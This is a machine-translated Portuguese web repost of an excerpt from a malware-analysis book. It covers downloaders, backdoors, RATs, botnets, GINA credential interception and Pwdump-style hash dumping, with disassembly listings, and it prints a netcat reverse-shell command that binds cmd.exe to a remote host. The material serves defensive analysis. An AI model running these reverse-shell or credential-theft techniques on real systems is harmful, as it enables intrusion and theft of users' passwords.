<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßõüèæ üôçüèª üßîüèº O livro "Uma aut√≥psia ser√° exibida!" An√°lise pr√°tica de malware ¬ª üëÇüèæ üåö üë¶üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A an√°lise de malware se assemelha a um jogo de gato e rato: sem regras, a situa√ß√£o est√° mudando constantemente. Portanto, neste caso, faz sentido estu...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>O livro "Uma aut√≥psia ser√° exibida!" An√°lise pr√°tica de malware ¬ª</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="imagem"></a>  A an√°lise de malware se assemelha a um jogo de gato e rato: sem regras, a situa√ß√£o est√° mudando constantemente.  Portanto, neste caso, faz sentido estudar apenas coisas e algoritmos atemporais.  Assim que se depara com a tarefa de proteger a rede (ou mil redes), voc√™ prossegue com essa an√°lise e simplesmente n√£o consegue ficar sem este livro. <br><br><h3>  Programas para baixar e executar software </h3><br>  Existem dois tipos de malware frequentemente encontrado, projetados para baixar e executar software.  Os downloaders (que n√£o devem ser confundidos com os downloaders do sistema) simplesmente baixam c√≥digos maliciosos adicionais da Internet e os executam em um computador local.  Eles s√£o frequentemente distribu√≠dos junto com a explora√ß√£o.  Eles geralmente usam duas chamadas de API do Windows, uma ap√≥s a outra, para baixar e executar malware adicional: URLDownloadtoFileA e WinExec. <br><a name="habracut"></a><br>  Launcher (launcher) √© um arquivo execut√°vel que instala aplicativos maliciosos para sua execu√ß√£o oculta (imediatamente ou ap√≥s algum tempo).  Os lan√ßadores geralmente v√™m com o software necess√°rio para executar.  Vamos discuti-los no cap√≠tulo 12. <br><br><h4>  Backdoors </h4><br>  Backdoors s√£o programas que fornecem ao invasor acesso ao computador da v√≠tima.  Eles s√£o o tipo de malware mais detect√°vel e seu tamanho e conjunto de recursos podem variar significativamente.  O c√≥digo de backdoor geralmente √© independente e n√£o requer o download de arquivos infectados adicionais. <br><br>  Os backdoors interagem pela Internet de v√°rias maneiras diferentes, mas os dados geralmente s√£o transmitidos por HTTP pela porta 80. O HTTP comp√µe a maior parte do tr√°fego de rede de sa√≠da, o que oferece ao malware uma grande oportunidade de passar despercebido no contexto de outras informa√ß√µes. <br><br>  No Cap√≠tulo 14, voc√™ aprender√° como analisar backdoors no n√≠vel de pacote, criando assinaturas de rede eficazes.  Enquanto isso, vamos nos concentrar na intera√ß√£o de alto n√≠vel. <br>  Os backdoors v√™m com um conjunto padr√£o de fun√ß√µes: a capacidade de manipular chaves do registro, contar as janelas exibidas, criar diret√≥rios, procurar arquivos etc. Para entender quais delas s√£o usadas pelo backdoor, voc√™ pode verificar quais fun√ß√µes da API do Windows s√£o importadas.  O Ap√™ndice A fornece uma lista de fun√ß√µes comuns que descrevem o que eles podem dizer sobre o malware. <br><br><h3>  Shell de Comando Reverso </h3><br>  Um shell de comando reverso √© uma conex√£o que inicia um computador infectado, dando acesso ao comando de um invasor.  Pode ser um programa malicioso separado ou um dos componentes de um backdoor mais complexo.  Enquanto estiver no shell de comando reverso, um invasor pode executar comandos como se tudo isso estivesse acontecendo em seu sistema local. <br><br><h4>  Shell de comando reverso do Netcat </h4><br>  O programa Netcat que discutimos no cap√≠tulo 3 pode ser usado para criar um shell de comando se voc√™ o executar em dois computadores.  Os invasores costumam us√°-lo por conta pr√≥pria, al√©m de complement√°-lo com outros malwares. <br>  Para usar o Netcat como tal, o sistema remoto deve aguardar as conex√µes de entrada usando o seguinte comando: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l ‚Äìp <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  A op√ß√£o -l alterna o Netcat para o modo de escuta e a op√ß√£o -p determina a porta que est√° sendo monitorada.  Em seguida, o computador da v√≠tima inicia uma conex√£o de sa√≠da e fornece seu shell de comando: <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  O ouvinte do ip 80 √© o endere√ßo IP e a porta do host remoto.  A op√ß√£o -e permite especificar o programa que ser√° executado quando a conex√£o for estabelecida.  Sua entrada e sa√≠da padr√£o ser√£o vinculadas ao soquete (como voc√™ ver√° mais adiante, o Windows geralmente usa o cmd.exe). <br><br><h4>  Shell reverso do Windows </h4><br>  Os invasores usam duas implementa√ß√µes simples de shell de comando reverso baseadas em cmd.exe no Windows: b√°sica e multiencadeada. <br><br>  O m√©todo b√°sico √© popular entre os autores de malware, pois √© mais f√°cil de implementar e geralmente n√£o funciona pior do que uma abordagem multithread.  Baseia-se em chamar CreateProcess e alterar a estrutura STARTUPINFO que √© passada para ele.  Primeiro, um soquete √© criado e uma conex√£o √© estabelecida com o servidor remoto.  Em seguida, esse soquete √© anexado aos threads padr√£o (entrada, sa√≠da e fluxo de erro) do processo cmd.exe.  O CreateProcess executa o cmd.exe no modo sem janelas para ocult√°-lo da v√≠tima.  O cap√≠tulo 7 d√° um exemplo dessa t√©cnica. <br><br>  Uma vers√£o multithread do shell de comando reverso do Windows implica criar um soquete, dois pipes e dois threads (portanto, voc√™ deve procurar pelas chamadas CreateThread e CreatePipe).  √Äs vezes, esse m√©todo √© usado pelos autores de malware como parte de uma estrat√©gia para modificar ou codificar dados transmitidos por um soquete.  A fun√ß√£o CreatePipe pode ser usada para ligar √†s extremidades de leitura e grava√ß√£o do canal, como entrada padr√£o (stdin) e sa√≠da padr√£o (stdout).  A fun√ß√£o CreateProcess permite vincular threads padr√£o a um canal, e n√£o diretamente a um soquete.  Ap√≥s cham√°-lo, o malware criar√° dois threads de execu√ß√£o: um para leitura do canal stdin e grava√ß√£o no soquete, e outro para leitura do soquete e grava√ß√£o no canal stdout.  Normalmente, esses encadeamentos s√£o dados de codifica√ß√£o, que discutiremos no Cap√≠tulo 13. Usando m√©todos de engenharia reversa, √© poss√≠vel examinar as ramifica√ß√µes nas quais os fluxos decodificam pacotes recebidos durante uma sess√£o criptografada. <br><br><h3>  Ferramentas de administra√ß√£o remota </h3><br>  As ferramentas de administra√ß√£o remota (RATs) s√£o usadas para controlar um computador ou computadores em uma rede.  Eles geralmente est√£o envolvidos em ataques direcionados de maneira restrita - por exemplo, ao roubar informa√ß√µes ou passar de um computador para outro. <br><br>  Na fig.  11.1 mostra a estrutura de rede do RAT.  O servidor em execu√ß√£o no sistema da v√≠tima est√° equipado com c√≥digo malicioso.  O cliente trabalha remotamente porque o m√≥dulo de controle est√° √† disposi√ß√£o do invasor.  Os servidores sinalizam o cliente que os controla para iniciar a conex√£o.  O interfuncionamento no RAT geralmente ocorre atrav√©s de portas padr√£o, como 80 ou 443. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="imagem"></div><br><h3>  Botnets </h3><br>  Uma botnet √© uma cole√ß√£o de n√≥s de rede infectados (zumbis) gerenciados centralmente, geralmente usando um servidor chamado controlador de botnet.  O objetivo da botnet √© infectar o maior n√∫mero poss√≠vel de computadores e criar uma rede de larga escala com base neles, que pode ser usada para espalhar outros malwares ou spam e para executar ataques DDoS (nega√ß√£o de servi√ßo distribu√≠da). )  Se todos os zumbis ao mesmo tempo come√ßarem a atacar um determinado site, isso poder√° se tornar inacess√≠vel. <br><br><h3>  Compara√ß√£o de RAT e Botnets </h3><br>  Existem v√°rias diferen√ßas importantes entre botnets e ferramentas de administra√ß√£o remota. <br><br><ul><li>  As redes de bots s√£o conhecidas por infectar e controlar milh√µes de n√≥s.  Os RATs geralmente s√£o executados por muito menos computadores. </li><li>  Todos os participantes da botnet s√£o gerenciados simultaneamente.  O RAT permite distribuir recursos entre diferentes v√≠timas, porque um invasor tem a capacidade de interagir mais de perto com os sistemas infectados. </li><li>  Os RATs s√£o usados ‚Äã‚Äãem ataques de alvo restrito, enquanto as redes de bots s√£o not√°veis ‚Äã‚Äãpor seu grande n√∫mero. </li></ul><br><h3>  Roubo de credenciais </h3><br>  Os atacantes costumam fazer todo tipo de truque para roubar credenciais.  Isto √© especialmente verdade para os tr√™s tipos de malware. <br><br><ul><li>  Programas que roubam credenciais do usu√°rio no momento em que ele efetua login no sistema. </li><li>  Programas que copiam as informa√ß√µes armazenadas no Windows (senhas, hashes etc.) para uso direto ou descriptografia adicional. </li><li>  Programas que gravam pressionamentos de tecla. </li></ul><br>  Nesta se√ß√£o, examinamos cada um desses tipos de malware. <br><br><h3>  Intercepta√ß√£o GINA </h3><br>  O Windows XP usa um truque para roubar credenciais, que consiste em interceptar a GINA (identifica√ß√£o e autentica√ß√£o gr√°fica).  O sistema GINA foi criado para permitir que aplicativos de terceiros adaptem o processo de login, adicionando suporte a tecnologias como identifica√ß√£o por radiofreq√º√™ncia (RFID) baseada em tokens ou cart√µes inteligentes.  Os autores de malware aproveitam a oportunidade para baixar o c√≥digo que rouba credenciais. <br><br>  GINA √© implementada como uma DLL chamada msgina.dll e √© carregada pelo Winlogon durante o logon.  O Winlogon tamb√©m oferece suporte a plug-ins de terceiros, carregando-os na frente da DLL da GINA (como em um ataque intermedi√°rio).  Por conveni√™ncia, o Windows fornece a seguinte ramifica√ß√£o do Registro, onde o Winlogon pode encontrar e carregar DLLs de terceiros: <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  Uma vez que encontramos um arquivo fsgina.dll infectado l√°, que acabou por ser um interceptador da GINA. <br>  Na fig.  A Figura 11.2 mostra um exemplo de como as informa√ß√µes de login chegam a uma biblioteca maliciosa, passando do Winlogon para o msgina.dll.  O malware (fsgina.dll) consegue interceptar todas as credenciais inseridas pelo usu√°rio durante a autentica√ß√£o.  Ele pode grav√°-lo em disco ou transferir pela rede. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="imagem"></div><br>  Como a biblioteca fsgina.dll intercepta o fluxo de intera√ß√£o entre o Winlogon e a GINA, ela deve ser repassada para o msgina.dll para que o sistema continue funcionando normalmente.  Para fazer isso, o malware precisa exportar todas as fun√ß√µes que o sistema GINA exige - h√° mais de 15 delas e a maioria delas possui o prefixo Wlx.  Obviamente, se voc√™ encontrar na DLL muitas fun√ß√µes de exporta√ß√£o que iniciam com o Wlx, provavelmente pode assumir que este √© um interceptador da GINA. <br><br>  A maioria dessas chamadas de exporta√ß√£o acessa fun√ß√µes reais dentro do msgina.dll.  No caso de fsgina.dll, isso se aplica a todas as fun√ß√µes, exceto WlxLoggedOutSAS.  A Listagem 11.1 mostra a exporta√ß√£o de WlxLoggedOutSAS para fsgina.dll. <br><br>  Listagem 11.1.  Fun√ß√£o de exporta√ß√£o WlxLoggedOutSAS na DLL GINA que registra credenciais roubadas <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  As informa√ß√µes da credencial s√£o transferidas imediatamente para o arquivo msgina.dll usando uma chamada designada como Call_msgina_dll_function (1).  Essa fun√ß√£o localiza e inicia dinamicamente a chamada WlxLoggedOutSAS do msgina.dll, que √© especificado como argumento.  Uma chamada on-line (2) registra dados.  Como argumentos, s√£o necess√°rias informa√ß√µes cont√°beis, uma sequ√™ncia de formato com a qual essas informa√ß√µes ser√£o exibidas e um nome de arquivo para grava√ß√£o.  Como resultado, as informa√ß√µes sobre qualquer logon bem-sucedido s√£o salvas no arquivo% SystemRoot% \ system32 \ drivers \ tcpudp.sys.  Este arquivo cont√©m o nome de usu√°rio, dom√≠nio e duas senhas - a atual e a antiga. <br><br><h3>  Salvando Hashes </h3><br>  O software malicioso no Windows geralmente salva os hashes do sistema para obter acesso √†s credenciais.  Ap√≥s salvar, os atacantes tentam descriptografar esses hashes offline ou us√°-los para atacar como pass-the-hash.  Durante esse ataque, os hashes LM e NTLM s√£o usados ‚Äã‚Äãpara autentica√ß√£o remota NTLM, que n√£o requer descriptografia e obten√ß√£o da senha correspondente. <br><br>  Para salvar os hashes, existem pacotes de software Pwdump e Pass-the-Hash (PSH) gratuitos.  Como essas duas ferramentas s√£o de c√≥digo aberto, muitos malwares foram criados com base. <br><br>  A maioria dos antiv√≠rus possui assinaturas para as vers√µes compiladas padr√£o desses utilit√°rios; portanto, os invasores geralmente tentam compilar suas pr√≥prias varia√ß√µes para evitar a detec√ß√£o.  Os exemplos neste cap√≠tulo s√£o os tipos de pwdump e PSH que encontramos na vida real. <br><br>  Pwdump √© um conjunto de programas que produzem hashes no formato LM i NTLM pertencentes a usu√°rios locais a partir do gerenciador de contas de seguran√ßa (SAM).  O Pwdump injeta a DLL no processo LSASS (servi√ßo de subsistema da autoridade de seguran√ßa local), mais conhecido como lsass.exe.  Discutiremos a implementa√ß√£o de DLLs no cap√≠tulo 12, mas, por enquanto, voc√™ s√≥ precisa saber que essa √© uma t√©cnica atrav√©s da qual o malware executa bibliotecas dentro de outros processos, usando todos os seus privil√©gios.  As ferramentas para salvar hashes geralmente atacam o processo lsass.exe porque ele possui privil√©gios e acesso suficientes a muitas fun√ß√µes √∫teis da API. <br><br>  A vers√£o padr√£o do Pwdump usa a biblioteca lsaext.dll.  Quando √© injetado no lsass.exe, ele chama a fun√ß√£o GetHash, que √© exportada do lsaext.dll para recuperar os hashes.  Ao mesmo tempo, s√£o utilizadas fun√ß√µes n√£o documentadas do Windows, que permitir√£o obter n√∫meros de s√©rie de todos os usu√°rios no sistema e hashes n√£o criptografados da senha de cada um deles. <br><br>  Diante da varia√ß√£o do Pwdump, voc√™ precisa analisar suas bibliotecas para entender como os hashes s√£o salvos.  A primeira coisa que voc√™ deve prestar aten√ß√£o √†s fun√ß√µes de exporta√ß√£o.  A chamada GetHash √© exportada do Pwdump por padr√£o, mas os invasores podem facilmente mudar seu nome para torn√°-lo menos reconhec√≠vel.  Em seguida, tente determinar as fun√ß√µes usadas nas chamadas de exporta√ß√£o.  Muitos deles podem ser localizados dinamicamente; portanto, as chamadas de exporta√ß√£o geralmente reutilizam a opera√ß√£o GetProcAddress. <br><br>  A Listagem 11.2 mostra o c√≥digo da fun√ß√£o de exporta√ß√£o GrabHash da DLL de uma vers√£o do Pwdump.  Como a biblioteca est√° incorporada no lsass.exe, antes de usar muitos caracteres, primeiro √© preciso encontr√°-los no modo manual. <br><br>  Listagem 11.2.  Chamadas de API exclusivas usadas pela fun√ß√£o de exporta√ß√£o GrabHash em uma das variantes do Pwdump <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  A Listagem 11.2 mostra o c√≥digo para recuperar os descritores da biblioteca samsrv.dll (1) e advapi32.dll (2) chamando LoadLibrary.  O arquivo samsrv.dll cont√©m uma API para facilitar o acesso ao SAM, e o arquivo advapi32.dll foi encontrado para acessar fun√ß√µes que n√£o foram importadas para o lsass.exe.  A biblioteca din√¢mica dessa varia√ß√£o Pwdump usa os descritores dessas bibliotecas para procurar muitas fun√ß√µes.  Os cinco mais importantes s√£o mostrados na lista (observe as chamadas GetProcAddress e seus argumentos). <br><br>  Chamadas interessantes como SamIConnect, SamrQueryInformationUser e SamIGetPrivateData s√£o importadas do samsrv.dll.  A chamada SamIConnect √© usada posteriormente para conectar-se ao SAM, ap√≥s o qual a fun√ß√£o SamrQueryInformationUser √© chamada para cada usu√°rio no sistema. <br><br>  Os hashes s√£o recuperados usando a chamada SamIGetPrivateData e descriptografados usando as fun√ß√µes SystemFunction025 e SystemFunction027 importadas do advapi32.dll (linhas (2) e (3)).  Nenhuma das fun√ß√µes da API nesta lista est√° descrita na documenta√ß√£o oficial. <br><br>  O PSH Toolkit cont√©m programas que criam despejos de hash.  O mais popular desses lix√µes √© conhecido como whosthere-alt.  Ele armazena o conte√∫do SAM obtido incorporando a DLL no lsass.exe.  Ao mesmo tempo, quando comparado ao Pwdump, um conjunto completamente diferente de fun√ß√µes da API √© usado.  A Listagem 11.3 mostra o c√≥digo da vers√£o para whosthere-alt, que exporta uma fun√ß√£o chamada TestDump. <br><br>  Listagem 11.3.  Chamadas de API exclusivas usadas pela fun√ß√£o de exporta√ß√£o TestDump da vers√£o whosthere-alt <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  Como essa biblioteca est√° incorporada no lsass.exe, sua fun√ß√£o TestDump cria um despejo de hash.  Ele carrega dinamicamente o arquivo secur32.dll e localiza a chamada LsaEnumerateLogonSessions (1) para obter uma lista de identificadores exclusivos localmente (LUIDs).  Esta lista cont√©m os nomes e dom√≠nios que foram indicados em cada login.  A biblioteca passa por eles para obter acesso √†s informa√ß√µes cont√°beis.  Para fazer isso, usando uma chamada para GetModuleHandle (2), ela procura no msv1_0.dll uma fun√ß√£o n√£o exportada, NlpGetPrimaryCredential, que permite o descarte de hashes NT e LM. <br><br><h3>  Sobre autores </h3><br>  <b>Michael Sikorski</b> √© especialista em seguran√ßa da Mandiant.  Ele est√° envolvido na an√°lise de malware como parte de uma investiga√ß√£o de incidente e √© consultor do governo dos EUA para seguran√ßa da informa√ß√£o.  Michael desenvolveu uma s√©rie de cursos de an√°lise de malware e os ensina a um p√∫blico diverso, incluindo o FBI e o Black Hat.  Antes de Mandiant, ele era um funcion√°rio do Laborat√≥rio Lincoln no Instituto de Tecnologia de Massachusetts e realizou pesquisas sobre topologia de rede passiva e testes de penetra√ß√£o.  Al√©m disso, Michael concluiu um programa de treinamento interdisciplinar de tr√™s anos em sistemas e redes na NSA.  Durante o treinamento, ele participou do estudo de t√©cnicas de engenharia reversa e recebeu v√°rios pr√™mios no campo de an√°lise de redes. <br><br>  <b>Andrew Honig</b> √© especialista em seguran√ßa da informa√ß√£o no Departamento de Defesa dos EUA.  Ele ensina an√°lise de software, engenharia reversa e programa√ß√£o para o sistema operacional Windows (OS) na National School of Cryptography, enquanto √© especialista em seguran√ßa de sistemas de informa√ß√£o certificado.  Por conta de Andrew, v√°rias explora√ß√µes de dia zero para a virtualiza√ß√£o VMware, bem como ferramentas para detectar malware inovador, incluindo m√≥dulos de kernel infectados.  Com dez anos de experi√™ncia como analista no campo da seguran√ßa de computadores, ele √© considerado um especialista em an√°lise e interpreta√ß√£o de programas maliciosos e comuns. <br><br>  ¬ªMais informa√ß√µes sobre o livro podem ser encontradas no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">site do editor</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Conte√∫do</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Trecho</a> <br><br>  Para Khabrozhiteley, um desconto de 20% no cupom - <b>uma aut√≥psia ser√° exibida</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt416143/">https://habr.com/ru/post/pt416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt416131/index.html">Como lidar com a DP na Federa√ß√£o Russa e n√£o violar a lei</a></li>
<li><a href="../pt416133/index.html">Data Center no exterior: Equinix LD8</a></li>
<li><a href="../pt416135/index.html">Aplicativo GUI menor que 1 kb</a></li>
<li><a href="../pt416137/index.html">Zabbix como um scanner de seguran√ßa</a></li>
